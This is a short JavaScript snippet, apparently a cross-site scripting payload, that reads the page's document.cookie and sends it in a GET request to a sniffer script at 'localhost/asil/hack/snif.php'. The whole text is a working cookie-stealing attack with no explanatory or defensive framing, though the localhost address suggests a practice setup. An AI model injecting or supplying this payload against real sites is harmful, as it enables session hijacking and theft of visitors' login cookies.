var xmlHttp = new XMLHttpRequest();
xmlHttp.open("GET", 'http://localhost/asil/hack/snif.php?cookie='+document.cookie);
xmlHttp.send(null);